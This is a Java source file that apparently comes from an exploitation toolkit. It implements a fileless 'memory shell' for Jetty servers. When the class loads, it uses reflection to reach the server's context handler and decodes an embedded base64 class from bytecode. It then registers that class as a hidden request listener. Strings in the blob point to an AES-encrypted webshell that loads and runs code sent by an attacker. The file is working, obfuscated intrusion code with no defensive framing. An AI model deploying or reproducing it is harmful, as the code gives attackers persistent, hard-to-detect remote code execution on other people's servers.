package core.memshell;

import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.EventListener;
import java.util.Iterator;
import java.util.List;

public class JettyListenerMemShell {
    public static Object MEMSHELL_OBJECT;
    static String ListenerName = "memshell.JettyListenerShell";

    public JettyListenerMemShell() {
        Object var1 = getContext();
        if (var1 != null && !isInjected(var1)) {
            injectMemShellClass();
            injectMemShell(var1);
        }
    }

    public static synchronized boolean isInjected(Object context) {
        try {
            List var2 = (List) getFV(context, "_eventListeners");
            ;
            Iterator var3 = var2.iterator();
            while (var3.hasNext()) {
                Object var4 = var3.next();
                if (var4.getClass().getName().contains(ListenerName)) {
                    return true;
                }
            }
        } catch (Exception e) {
        }
        return false;
    }

    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    private static synchronized Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }
        return method;
    }

    public static synchronized void injectMemShell(Object context) {
        try {
            Method var3 = getMethodByClass(context.getClass(), "addEventListener", EventListener.class);
            var3.setAccessible(true);
            var3.invoke(context, MEMSHELL_OBJECT);
        } catch (Exception e) {

        }
    }

    public static synchronized Object getContext() {
        try {
            Thread var1 = Thread.currentThread();
            Field var2 = Class.forName("java.lang.Thread").getDeclaredField("threadLocals");
            var2.setAccessible(true);
            Object var3 = var2.get(var1);
            Class var4 = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
            Field var5 = var4.getDeclaredField("table");
            var5.setAccessible(true);
            Object var6 = var5.get(var3);
            Class var7 = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
            Field var8 = var7.getDeclaredField("value");
            var8.setAccessible(true);
            Object var9 = null;

            for(int var11 = 0; var11 < Array.getLength(var6); ++var11) {
                Object var10 = Array.get(var6, var11);
                if (var10 != null) {
                    var9 = var8.get(var10);
                    if (var9 != null && var9.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection")) {
                        break;
                    }
                }
            }
            Class var23 = var9.getClass();
            Object var12 = var23.getMethod("getHttpChannel").invoke(var9);
            Object var13 = var12.getClass().getMethod("getRequest").invoke(var12);
            Object var16 = var13.getClass().getMethod("getSession").invoke(var13);
            Object var17 = var16.getClass().getMethod("getServletContext").invoke(var16);
            Object var19 = getFV(var17, "this$0");
            Object var21 = getFV(var19, "_servletHandler");
            Object var24 = getFV(var21, "_contextHandler");
            return var24;

        } catch (Exception var22) {
        }

        return null;
    }

    public static void injectMemShellClass() {
        try {
            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(ListenerName).newInstance();
        } catch (Exception var5) {
            try {
                Method var1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                var1.setAccessible(true);
                byte[] var2 = base64Decode("yv66vgAAADMBbAoAZAC+CQBGAL8JAEYAwAgAwQkARgDCCADDCQBGAMQIAMUJAEYAxgcAxwoACgC+CgAKAMgKAAoAyQoARgDKCQBGAMsIAMwJAEYAzQoAZADOCgBkAM8IANAKANEA0gcA0woAMQDUCgAWANUKANEA1goA0QDXBwDYCADZCgDaANsKADEA3AoA2gDdBwDeCgDaAN8KACAA4AoAIADhCgAxAOIIAOMKAC4A5AgA5QcA5goALgDnBwDoCgDpAOoKADAA6wgA7AcA7QcAfQcA7gcA7wgA8AoALgDxCADyCADzCAD0CAD1CAD2CgD3APgHAPkKAEYA+ggA+wsAOgD8CAD9CgAxAP4LADoA/wsAOgEACgBGAQEKAEYBAggBAwsBBAEFBwEGCgAuAQcKAEYAzgoARgEICwEEAQkIAQoLADoBCQcBCwoATQC+CgAwAQwLAGMBDQoAMQEOCgEPARAKADAAyQoATQERCgBGARIKADEBEwgBFAgBFQoAGwEWCgAuARcHARgKAC4BGQoAWwEaCgEbARwKARsBHQgBHgoARgEfCAEgBwEhBwEiBwEjAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAAnhjAQASTGphdmEvbGFuZy9TdHJpbmc7AQADUHdkAQAEcGF0aAEAA21kNQEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB1MbWVtc2hlbGwvSmV0dHlMaXN0ZW5lclNoZWxsOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABegEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAmNiAQACW0IBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAR2YXI0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABcwEAAW0BAAFaAQANU3RhY2tNYXBUYWJsZQcBBgcBJAcA2AEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAANyZXQHAO8BAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABmJhc2U2NAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyNgEAAmJzAQAFdmFsdWUBAApFeGNlcHRpb25zAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBABByZXF1ZXN0RGVzdHJveWVkAQAmKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7KVYBAANyZXEBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkHASUHAPkHASEHASYBAAVnZXRGVgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAEdmFyNQEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQAEdmFyMAEABHZhcjEBAAR2YXIyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABHZhcjMHAScHAO0HARgBABZnZXRSZXNwb25zZUZyb21SZXF1ZXN0AQBRKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQACbzEBAAJvMgEAClNvdXJjZUZpbGUBABdKZXR0eUxpc3RlbmVyU2hlbGwuamF2YQwAcABxDABmAGcMAGgAaQEAEDNjNmUwYjhhOWMxNTIyNGEMAGoAawEABHBBUzMMAGwAawEAEC9mYXZpY29uZGVtby5pY28MAG0AawEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEoASkMASoBKwwAbgCLDABuAGsBAAVVVEYtOAwAbwBrDABwAHcMASwBLQEAA0FFUwcBJAwBLgEvAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwBMAExDABwATIMATMBNAwBNQE2AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAA01ENQcBNwwBLgE4DAE5AToMATsBPAEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAE9ATEMAHABPgwBKgE/DAFAASsBABBqYXZhLnV0aWwuQmFzZTY0DAFBAUIBAApnZXRFbmNvZGVyAQASW0xqYXZhL2xhbmcvQ2xhc3M7DAFDAUQBABNbTGphdmEvbGFuZy9PYmplY3Q7BwFFDAFGAUcMAUgBSQEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAFKAUsBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgcBJQwBTAFNAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAuAC5AQAQWC1SZXF1ZXN0ZWQtV2l0aAwBTgCLAQAOWE1MSFRUUFJlcXVlc3QMAU8BUAwBUQFSDAFTAIsMAJkAmgwAfgB/AQAQbWVtc2hlbGwucGF5bG9hZAcBJgwBVAFVAQAbbWVtc2hlbGwvSmV0dHlMaXN0ZW5lclNoZWxsDAFWAVcMAHoAewwBWAFZAQAKcGFyYW1ldGVycwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAFaAVsMAVwBXQwBXgFfBwFgDAFhAWIMAWMBMQwAjwCQDAFeAT8BAA5YbWxIVFRQUmVxdWVzdAEAB1N1Y2Nlc3MMAWQAcQwBZQFmAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAFnAUkMAHABYgcBJwwBaAFpDAFqAWsBAAhfY2hhbm5lbAwArACtAQAJX3Jlc3BvbnNlAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAB2RvRmluYWwBAAYoW0IpW0IBABtqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3QBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQAGbGVuZ3RoAQADKClJAQAGdXBkYXRlAQAHKFtCSUkpVgEABmRpZ2VzdAEABihJW0IpVgEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldFNlcnZsZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAlnZXRIZWFkZXIBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAxnZXRQYXJhbWV0ZXIBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAC3RvQnl0ZUFycmF5AQAPcHJpbnRTdGFja1RyYWNlAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADWdldFN1cGVyY2xhc3MBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7ACEARgBkAAEAZQAHAAEAZgBnAAAAAQBoAGkAAAAAAGoAawAAAAEAbABrAAAAAQBtAGsAAAAAAG4AawAAAAEAbwBrAAAACwABAHAAcQABAHIAAACQAAMAAQAAAEYqtwABKgG1AAIqAbUAAyoSBLUABSoSBrUAByoSCLUACSq7AApZtwALKrQAB7YADCq0AAW2AAy2AA24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");
                Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);
                MEMSHELL_OBJECT = var3.newInstance();
            } catch (Exception var4) {
            }
        }

    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }

    static{
        new JettyListenerMemShell();
    }
}
